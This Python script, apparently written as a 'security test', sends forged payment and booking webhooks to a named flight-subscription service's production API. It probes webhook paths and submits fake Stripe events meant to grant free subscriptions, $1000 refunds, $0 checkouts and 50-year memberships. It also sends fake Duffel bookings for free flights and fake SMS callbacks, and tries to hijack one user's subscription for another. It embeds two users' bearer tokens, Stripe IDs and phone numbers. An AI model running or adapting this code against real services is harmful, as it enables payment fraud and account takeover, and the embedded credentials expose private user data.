#!/usr/bin/env python3
"""
COMPREHENSIVE WEBHOOK & CALLBACK MANIPULATION SECURITY TEST
===========================================================

Tests ALL possible webhook and callback manipulation vulnerabilities in the Vaunt API:

1. Stripe Webhook Endpoint Discovery
2. Stripe Webhook Forgery (payment success, subscription activation, refunds)
3. Stripe Signature Bypass Attempts
4. Duffel Callback Manipulation
5. SMS Callback/Delivery Manipulation
6. Webhook Replay Attacks
7. Parameter Injection in Webhooks
8. Amount/Status Manipulation
9. Cross-User Webhook Attacks
10. Timestamp Manipulation
11. Event Type Confusion
12. Header-Based Webhook Bypass
13. Webhook URL Enumeration
14. SSRF via Webhook URLs

CRITICAL: Webhook vulnerabilities can allow:
- Free subscription activation
- Free flight bookings
- Fake refunds for credits
- Payment bypass
- Subscription hijacking

Test Accounts:
- Sameer (User 20254): Has Cabin+ subscription
- Ashley (User 171208): No subscription

Author: Security Testing Suite
Date: November 5, 2025
CVSS: Potential 9.8 (Critical) if webhooks can be forged
"""

import requests
import json
import time
from datetime import datetime
import hashlib
import hmac

# API Configuration
PROD_URL = "https://vauntapi.flyvaunt.com"

# Test Account Credentials
SAMEER = {
    "name": "Sameer",
    "user_id": 20254,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q",
    "stripe_customer": "cus_PlS5D89fzdDYgF",
    "stripe_subscription": "sub_1RXC7YBkrWmvysmuXyGVEYPF",
    "phone": "+13035234453"
}

ASHLEY = {
    "name": "Ashley",
    "user_id": 171208,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg",
    "stripe_customer": "cus_TMQ5kN5yjgYTLR",
    "phone": "+15555555555"
}

# Results tracking
results = {
    "total_tests": 0,
    "webhooks_found": [],
    "webhooks_accepting_data": [],
    "signature_bypass": [],
    "successful_exploits": [],
    "critical_vulnerabilities": [],
    "high_vulnerabilities": [],
    "medium_vulnerabilities": [],
    "low_vulnerabilities": []
}

def make_request(method, endpoint, data=None, headers=None, token=None, allow_auth=True):
    """Make HTTP request with optional authentication"""
    default_headers = {
        "Content-Type": "application/json"
    }

    if token and allow_auth:
        default_headers["Authorization"] = f"Bearer {token}"

    if headers:
        default_headers.update(headers)

    url = f"{PROD_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=default_headers, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=default_headers, json=data, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=default_headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=default_headers, json=data, timeout=10)
        elif method == "DELETE":
            r = requests.delete(url, headers=default_headers, timeout=10)

        result = {
            "status": r.status_code,
            "data": None,
            "raw": r.text[:500] if r.text else None,
            "headers": dict(r.headers)
        }

        if r.text:
            try:
                result["data"] = r.json()
            except:
                result["data"] = r.text[:200]

        return result
    except Exception as e:
        return {
            "status": "error",
            "error": str(e),
            "data": None
        }

def get_user_status(token):
    """Get current user status"""
    result = make_request("GET", "/v1/user", token=token)
    if result['status'] == 200 and result['data']:
        return {
            "subscriptionStatus": result['data'].get('subscriptionStatus'),
            "stripeSubscriptionId": result['data'].get('stripeSubscriptionId'),
            "stripeCustomerId": result['data'].get('stripeCustomerId'),
            "priorityScore": result['data'].get('priorityScore'),
            "membershipTier": result['data'].get('membershipTier')
        }
    return None

def test_webhook_endpoint(endpoint, test_name, payload, headers=None, token=None, user_account=None):
    """Test a webhook endpoint with forgery attempt"""
    global results
    results["total_tests"] += 1

    print(f"\n{'='*80}")
    print(f"🔥 TEST #{results['total_tests']}: {test_name}")
    print(f"{'='*80}")
    print(f"   Endpoint: POST {endpoint}")
    print(f"   Payload: {json.dumps(payload, indent=2)[:300]}")
    if headers:
        print(f"   Custom Headers: {headers}")

    # Get baseline if testing with user account
    baseline = None
    if user_account:
        baseline = get_user_status(user_account['token'])
        print(f"   Testing with: {user_account['name']} (User {user_account['user_id']})")

    # Test 1: Without authentication
    print(f"\n   [1] Testing WITHOUT authentication (proper webhook behavior)...")
    result_no_auth = make_request("POST", endpoint, payload, headers, allow_auth=False)
    print(f"       Status: {result_no_auth['status']}")

    # Test 2: With authentication (shouldn't be needed for webhooks)
    if token:
        print(f"\n   [2] Testing WITH authentication (security issue if accepted)...")
        result_with_auth = make_request("POST", endpoint, payload, headers, token=token)
        print(f"       Status: {result_with_auth['status']}")
    else:
        result_with_auth = {"status": "skipped"}

    # Test 3: Without signature (Stripe webhooks should have signature)
    print(f"\n   [3] Testing WITHOUT Stripe signature...")
    result_no_sig = make_request("POST", endpoint, payload, allow_auth=False)
    print(f"       Status: {result_no_sig['status']}")

    # Test 4: With invalid signature
    print(f"\n   [4] Testing WITH INVALID Stripe signature...")
    fake_sig_headers = {
        "Stripe-Signature": "t=1234567890,v1=fake_signature_12345678901234567890"
    }
    if headers:
        fake_sig_headers.update(headers)
    result_fake_sig = make_request("POST", endpoint, payload, fake_sig_headers, allow_auth=False)
    print(f"       Status: {result_fake_sig['status']}")

    # Analyze results
    endpoint_found = False
    accepts_data = False
    vulnerability = None

    for result in [result_no_auth, result_with_auth, result_no_sig, result_fake_sig]:
        if result['status'] == 200:
            endpoint_found = True
            accepts_data = True

            if endpoint not in results["webhooks_found"]:
                results["webhooks_found"].append(endpoint)

            if endpoint not in results["webhooks_accepting_data"]:
                results["webhooks_accepting_data"].append(endpoint)

            print(f"\n   🚨 WEBHOOK ACCEPTED DATA! Status 200")
            print(f"   Response: {result['raw'][:200]}")

            # Check if user status changed
            if user_account:
                time.sleep(0.5)
                new_status = get_user_status(user_account['token'])

                if baseline and new_status and new_status != baseline:
                    print(f"\n   🚨🚨🚨 CRITICAL: USER DATA MODIFIED BY WEBHOOK!")
                    print(f"   Changes detected:")

                    changes = []
                    for key in baseline.keys():
                        if baseline[key] != new_status[key]:
                            print(f"      - {key}: {baseline[key]} → {new_status[key]}")
                            changes.append(f"{key}: {baseline[key]} → {new_status[key]}")

                    vulnerability = {
                        "test_name": test_name,
                        "endpoint": endpoint,
                        "payload": payload,
                        "severity": "CRITICAL",
                        "cvss": 9.8,
                        "description": "Webhook endpoint accepts forged data and modifies user account",
                        "changes": changes,
                        "before": baseline,
                        "after": new_status
                    }

                    results["successful_exploits"].append(vulnerability)
                    results["critical_vulnerabilities"].append(vulnerability)

            break
        elif result['status'] == 404:
            print(f"   ❌ Endpoint not found (404)")
        elif result['status'] == 401:
            print(f"   ✅ Authentication required (401) - webhook should NOT require auth")
            endpoint_found = True
        elif result['status'] == 400:
            print(f"   ⚠️  Bad request (400)")
            endpoint_found = True
            if result['data']:
                print(f"   Error: {result['data']}")

    # Log signature bypass if endpoint accepts without valid signature
    if result_no_sig['status'] == 200 or result_fake_sig['status'] == 200:
        if endpoint not in results["signature_bypass"]:
            results["signature_bypass"].append(endpoint)
            print(f"\n   🚨 SIGNATURE BYPASS: Webhook accepts data without valid Stripe signature!")

            if not vulnerability:
                vulnerability = {
                    "test_name": test_name,
                    "endpoint": endpoint,
                    "severity": "CRITICAL",
                    "cvss": 9.5,
                    "description": "Webhook endpoint does not verify Stripe signature - allows forgery"
                }
                results["critical_vulnerabilities"].append(vulnerability)

    return {
        "endpoint_found": endpoint_found,
        "accepts_data": accepts_data,
        "vulnerability": vulnerability
    }

def main():
    """Run comprehensive webhook manipulation tests"""

    print("="*80)
    print("COMPREHENSIVE WEBHOOK & CALLBACK MANIPULATION SECURITY TEST")
    print("="*80)
    print(f"Target API: {PROD_URL}")
    print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Testing for webhook forgery, signature bypass, and callback manipulation")
    print("="*80)

    # ========================================================================
    # PHASE 1: STRIPE WEBHOOK ENDPOINT DISCOVERY
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 1: STRIPE WEBHOOK ENDPOINT DISCOVERY")
    print("="*80)

    stripe_webhook_endpoints = [
        "/webhook/stripe",
        "/webhooks/stripe",
        "/api/webhook/stripe",
        "/api/webhooks/stripe",
        "/v1/webhook/stripe",
        "/v1/webhooks/stripe",
        "/v2/webhook/stripe",
        "/v2/webhooks/stripe",
        "/v3/webhook/stripe",
        "/v3/webhooks/stripe",
        "/stripe/webhook",
        "/stripe/webhooks",
        "/payments/webhook",
        "/payment/webhook",
        "/subscription/webhook",
        "/webhooks",
        "/webhook",
    ]

    print(f"\n🔍 Testing {len(stripe_webhook_endpoints)} potential Stripe webhook endpoints...")

    for endpoint in stripe_webhook_endpoints:
        result = make_request("POST", endpoint, {"test": "discovery"}, allow_auth=False)
        if result['status'] != 404:
            print(f"   ✓ Found: {endpoint} (Status: {result['status']})")
            if endpoint not in results["webhooks_found"]:
                results["webhooks_found"].append(endpoint)
        else:
            print(f"   ✗ Not found: {endpoint}")

    print(f"\n📊 Discovery Results:")
    print(f"   Webhook endpoints found: {len(results['webhooks_found'])}")
    if results['webhooks_found']:
        for endpoint in results['webhooks_found']:
            print(f"      - {endpoint}")

    # ========================================================================
    # PHASE 2: STRIPE WEBHOOK FORGERY - PAYMENT SUCCESS
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 2: STRIPE WEBHOOK FORGERY - PAYMENT SUCCESS")
    print("="*80)

    # Test common webhook endpoints + discovered ones
    test_endpoints = list(set(stripe_webhook_endpoints + results["webhooks_found"]))

    for endpoint in test_endpoints[:10]:  # Test top 10 most likely
        # Payment success webhook
        payment_success_payload = {
            "id": "evt_fake_payment_123",
            "object": "event",
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "id": "pi_fake_12345",
                    "object": "payment_intent",
                    "amount": 5000,
                    "currency": "usd",
                    "customer": ASHLEY['stripe_customer'],
                    "status": "succeeded",
                    "metadata": {
                        "userId": str(ASHLEY['user_id']),
                        "tier": "cabin_plus"
                    }
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge payment success webhook for Ashley - {endpoint}",
            payment_success_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 3: STRIPE WEBHOOK FORGERY - SUBSCRIPTION CREATED
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 3: STRIPE WEBHOOK FORGERY - SUBSCRIPTION CREATED")
    print("="*80)

    for endpoint in test_endpoints[:10]:
        subscription_created_payload = {
            "id": "evt_fake_sub_created_123",
            "object": "event",
            "type": "customer.subscription.created",
            "data": {
                "object": {
                    "id": "sub_fake_ashley_123",
                    "object": "subscription",
                    "customer": ASHLEY['stripe_customer'],
                    "status": "active",
                    "plan": {
                        "id": "cabin_plus_monthly",
                        "amount": 5000,
                        "currency": "usd"
                    },
                    "metadata": {
                        "userId": str(ASHLEY['user_id'])
                    },
                    "current_period_start": int(time.time()),
                    "current_period_end": int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge subscription created webhook for Ashley - {endpoint}",
            subscription_created_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 4: STRIPE WEBHOOK FORGERY - SUBSCRIPTION REACTIVATION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 4: STRIPE WEBHOOK FORGERY - SUBSCRIPTION REACTIVATION")
    print("="*80)

    for endpoint in test_endpoints[:5]:
        subscription_updated_payload = {
            "id": "evt_fake_sub_update_123",
            "object": "event",
            "type": "customer.subscription.updated",
            "data": {
                "object": {
                    "id": SAMEER['stripe_subscription'],  # Use real sub ID
                    "object": "subscription",
                    "customer": ASHLEY['stripe_customer'],  # But Ashley's customer
                    "status": "active",
                    "cancel_at_period_end": False,
                    "metadata": {
                        "userId": str(ASHLEY['user_id'])  # Ashley's user ID
                    }
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge subscription hijack - Link Sameer's sub to Ashley - {endpoint}",
            subscription_updated_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 5: STRIPE WEBHOOK FORGERY - REFUND (Credit Addition)
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 5: STRIPE WEBHOOK FORGERY - REFUND FOR CREDITS")
    print("="*80)

    for endpoint in test_endpoints[:5]:
        refund_payload = {
            "id": "evt_fake_refund_123",
            "object": "event",
            "type": "charge.refunded",
            "data": {
                "object": {
                    "id": "ch_fake_12345",
                    "object": "charge",
                    "amount": 100000,  # $1000 refund
                    "amount_refunded": 100000,
                    "customer": ASHLEY['stripe_customer'],
                    "refunded": True,
                    "metadata": {
                        "userId": str(ASHLEY['user_id'])
                    }
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge refund webhook for $1000 credit - {endpoint}",
            refund_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 6: STRIPE WEBHOOK FORGERY - CHECKOUT SESSION COMPLETED
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 6: STRIPE WEBHOOK FORGERY - CHECKOUT COMPLETED")
    print("="*80)

    for endpoint in test_endpoints[:5]:
        checkout_payload = {
            "id": "evt_fake_checkout_123",
            "object": "event",
            "type": "checkout.session.completed",
            "data": {
                "object": {
                    "id": "cs_fake_12345",
                    "object": "checkout.session",
                    "customer": ASHLEY['stripe_customer'],
                    "subscription": "sub_fake_ashley_123",
                    "payment_status": "paid",
                    "amount_total": 0,  # $0 payment
                    "metadata": {
                        "userId": str(ASHLEY['user_id']),
                        "tier": "cabin_plus"
                    }
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge checkout completed with $0 amount - {endpoint}",
            checkout_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 7: AMOUNT MANIPULATION IN WEBHOOKS
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 7: AMOUNT MANIPULATION IN WEBHOOKS")
    print("="*80)

    for endpoint in test_endpoints[:3]:
        # Test negative amount
        negative_amount_payload = {
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "amount": -10000,  # Negative $100
                    "customer": ASHLEY['stripe_customer']
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge webhook with NEGATIVE amount - {endpoint}",
            negative_amount_payload,
            user_account=ASHLEY
        )

        # Test $0.01 payment for premium
        penny_payment_payload = {
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "amount": 1,  # $0.01
                    "customer": ASHLEY['stripe_customer'],
                    "metadata": {"tier": "cabin_plus"}
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge $0.01 payment for Cabin+ - {endpoint}",
            penny_payment_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 8: TIMESTAMP MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 8: TIMESTAMP MANIPULATION IN WEBHOOKS")
    print("="*80)

    for endpoint in test_endpoints[:3]:
        # Backdate subscription to get long period
        backdated_payload = {
            "type": "customer.subscription.created",
            "data": {
                "object": {
                    "id": "sub_fake_123",
                    "customer": ASHLEY['stripe_customer'],
                    "status": "active",
                    "created": 946684800,  # Jan 1, 2000
                    "current_period_start": 946684800,
                    "current_period_end": 2524608000,  # Jan 1, 2050 (50 years!)
                    "metadata": {"userId": str(ASHLEY['user_id'])}
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge backdated 50-year subscription - {endpoint}",
            backdated_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 9: EVENT TYPE CONFUSION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 9: EVENT TYPE CONFUSION")
    print("="*80)

    for endpoint in test_endpoints[:3]:
        # Wrong event type with subscription data
        confused_payload = {
            "type": "payment_intent.created",  # Wrong type (created, not succeeded)
            "data": {
                "object": {
                    "status": "succeeded",  # But claim succeeded
                    "customer": ASHLEY['stripe_customer'],
                    "subscription": "sub_fake_123",
                    "amount": 0
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Event type confusion attack - {endpoint}",
            confused_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 10: CROSS-USER WEBHOOK MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 10: CROSS-USER WEBHOOK MANIPULATION")
    print("="*80)

    for endpoint in test_endpoints[:3]:
        # Try to activate subscription for Ashley using Sameer's data
        cross_user_payload = {
            "type": "customer.subscription.updated",
            "data": {
                "object": {
                    "id": SAMEER['stripe_subscription'],
                    "customer": SAMEER['stripe_customer'],  # Sameer's customer
                    "status": "active",
                    "metadata": {
                        "userId": str(ASHLEY['user_id'])  # But for Ashley's user ID!
                    }
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Cross-user webhook manipulation - {endpoint}",
            cross_user_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 11: DUFFEL BOOKING CALLBACK MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 11: DUFFEL BOOKING CALLBACK MANIPULATION")
    print("="*80)

    duffel_endpoints = [
        "/webhook/duffel",
        "/webhooks/duffel",
        "/api/webhook/duffel",
        "/v1/webhook/duffel",
        "/v1/webhooks/duffel",
        "/duffel/webhook",
        "/duffel/callback",
        "/booking/callback",
        "/booking/webhook",
    ]

    for endpoint in duffel_endpoints[:5]:
        duffel_booking_payload = {
            "event": "order.confirmed",
            "data": {
                "order_id": "ord_fake_ashley_123",
                "user_id": ASHLEY['user_id'],
                "status": "confirmed",
                "paid": True,
                "amount": 0.00,  # Free flight!
                "booking_reference": "FAKERF",
                "passenger": {
                    "user_id": ASHLEY['user_id']
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge Duffel booking confirmation - Free flight - {endpoint}",
            duffel_booking_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 12: SMS DELIVERY CALLBACK MANIPULATION
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 12: SMS DELIVERY CALLBACK MANIPULATION")
    print("="*80)

    sms_endpoints = [
        "/webhook/sms",
        "/webhooks/sms",
        "/callback/sms",
        "/v1/callback/sms",
        "/v1/webhook/sms",
        "/sms/callback",
        "/sms/delivery",
        "/twilio/callback",
    ]

    for endpoint in sms_endpoints[:5]:
        sms_delivery_payload = {
            "MessageSid": "SMfake12345",
            "MessageStatus": "delivered",
            "To": ASHLEY['phone'],
            "From": "+15555555555",
            "Body": "Your verification code is: 123456",
            "SmsSid": "SMfake12345"
        }

        test_webhook_endpoint(
            endpoint,
            f"Forge SMS delivery callback - {endpoint}",
            sms_delivery_payload,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 13: HEADER-BASED WEBHOOK BYPASS
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 13: HEADER-BASED WEBHOOK BYPASS")
    print("="*80)

    bypass_headers = [
        {"X-Stripe-Webhook": "true"},
        {"X-Internal-Webhook": "true"},
        {"X-Bypass-Signature": "true"},
        {"X-Test-Webhook": "true"},
        {"X-Webhook-Source": "stripe"},
        {"User-Agent": "Stripe/1.0 WebhookBot"},
    ]

    for headers in bypass_headers[:3]:
        test_webhook_endpoint(
            "/v1/webhook/stripe",
            f"Webhook bypass with header {list(headers.keys())[0]}",
            {"type": "customer.subscription.created", "data": {"object": {"customer": ASHLEY['stripe_customer']}}},
            headers=headers,
            user_account=ASHLEY
        )

    # ========================================================================
    # PHASE 14: AUTHENTICATED WEBHOOK (Security Anti-Pattern)
    # ========================================================================
    print("\n" + "="*80)
    print("PHASE 14: AUTHENTICATED WEBHOOK ENDPOINTS (Anti-Pattern)")
    print("="*80)

    print("\nℹ️  Webhooks should NOT require authentication (they come from external services)")
    print("   If webhook endpoints accept authenticated requests, users can trigger them!")

    for endpoint in test_endpoints[:5]:
        authenticated_webhook_payload = {
            "type": "customer.subscription.created",
            "data": {
                "object": {
                    "id": "sub_fake_123",
                    "customer": ASHLEY['stripe_customer'],
                    "status": "active"
                }
            }
        }

        test_webhook_endpoint(
            endpoint,
            f"Authenticated webhook request (user-triggered) - {endpoint}",
            authenticated_webhook_payload,
            token=ASHLEY['token'],
            user_account=ASHLEY
        )

    # ========================================================================
    # GENERATE FINAL REPORT
    # ========================================================================
    print("\n" + "="*80)
    print("FINAL RESULTS & SECURITY ASSESSMENT")
    print("="*80)

    print(f"\n📊 TEST SUMMARY:")
    print(f"   Total Tests Executed: {results['total_tests']}")
    print(f"   Webhook Endpoints Found: {len(results['webhooks_found'])}")
    print(f"   Webhooks Accepting Data: {len(results['webhooks_accepting_data'])}")
    print(f"   Signature Bypass Possible: {len(results['signature_bypass'])}")
    print(f"   Successful Exploits: {len(results['successful_exploits'])}")

    print(f"\n⚠️  VULNERABILITY SEVERITY:")
    print(f"   🔴 CRITICAL: {len(results['critical_vulnerabilities'])}")
    print(f"   🟠 HIGH: {len(results['high_vulnerabilities'])}")
    print(f"   🟡 MEDIUM: {len(results['medium_vulnerabilities'])}")
    print(f"   🟢 LOW: {len(results['low_vulnerabilities'])}")

    print("\n" + "="*80)
    print("KEY SECURITY QUESTIONS")
    print("="*80)

    print(f"\n❓ Are there any Stripe webhook endpoints?")
    if results['webhooks_found']:
        print(f"   🚨 YES - {len(results['webhooks_found'])} webhook endpoints found:")
        for endpoint in results['webhooks_found']:
            print(f"      - {endpoint}")
    else:
        print(f"   ℹ️  NO - No webhook endpoints found")
        print(f"   ⚠️  WARNING: This could mean Stripe webhooks are not implemented!")
        print(f"   Without webhooks, subscription updates may not be processed properly.")

    print(f"\n❓ Can webhook signatures be bypassed?")
    if results['signature_bypass']:
        print(f"   🚨 YES - CRITICAL VULNERABILITY!")
        print(f"   {len(results['signature_bypass'])} endpoints accept data without valid signatures:")
        for endpoint in results['signature_bypass']:
            print(f"      - {endpoint}")
    else:
        print(f"   ✅ NO - Proper signature verification (or no webhook endpoints)")

    print(f"\n❓ Can webhooks be forged to activate subscriptions?")
    subscription_exploits = [v for v in results['successful_exploits']
                           if 'subscription' in v.get('test_name', '').lower()]
    if subscription_exploits:
        print(f"   🚨 YES - CRITICAL! {len(subscription_exploits)} subscription exploits found!")
        for exploit in subscription_exploits:
            print(f"      - {exploit['test_name']}")
    else:
        print(f"   ✅ NO - Webhook forgery not possible")

    print(f"\n❓ Can webhooks be forged to get free flights?")
    duffel_exploits = [v for v in results['successful_exploits']
                      if 'duffel' in v.get('test_name', '').lower() or 'booking' in v.get('test_name', '').lower()]
    if duffel_exploits:
        print(f"   🚨 YES - CRITICAL! {len(duffel_exploits)} Duffel booking exploits found!")
    else:
        print(f"   ✅ NO - Duffel webhooks secured or not present")

    print(f"\n❓ Can webhooks be replayed?")
    print(f"   ⚠️  UNTESTED - Replay attacks require capturing real webhooks")
    print(f"   Recommendation: Implement webhook event ID tracking to prevent replays")

    if results['successful_exploits']:
        print("\n" + "="*80)
        print("🚨 DETAILED VULNERABILITY FINDINGS")
        print("="*80)

        for i, vuln in enumerate(results['successful_exploits'], 1):
            print(f"\n{'='*80}")
            print(f"VULNERABILITY #{i}: {vuln['test_name']}")
            print(f"{'='*80}")
            print(f"Severity: {vuln['severity']} (CVSS: {vuln.get('cvss', 'N/A')})")
            print(f"Endpoint: {vuln['endpoint']}")
            print(f"Description: {vuln['description']}")

            if vuln.get('changes'):
                print(f"\nChanges Made:")
                for change in vuln['changes']:
                    print(f"  - {change}")

            print(f"\nPayload:")
            print(json.dumps(vuln.get('payload', {}), indent=2))

    # Check Ashley's final status
    print("\n" + "="*80)
    print("FINAL USER STATUS CHECK")
    print("="*80)

    ashley_final = get_user_status(ASHLEY['token'])
    print(f"\n🔴 Ashley's Final Status:")
    print(f"   Subscription Status: {ashley_final.get('subscriptionStatus')}")
    print(f"   Membership Tier: {ashley_final.get('membershipTier')}")
    print(f"   Stripe Subscription ID: {ashley_final.get('stripeSubscriptionId')}")
    print(f"   Priority Score: {ashley_final.get('priorityScore')}")

    if ashley_final.get('subscriptionStatus') == 3:
        print(f"\n   🚨🚨🚨 CRITICAL: Ashley has Cabin+ - Webhook exploit successful!")

    # Save results to JSON
    with open('/home/user/vaunt/api_testing/webhook_manipulation_results.json', 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n✅ Results saved to webhook_manipulation_results.json")
    print(f"\nTest completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)

if __name__ == "__main__":
    main()
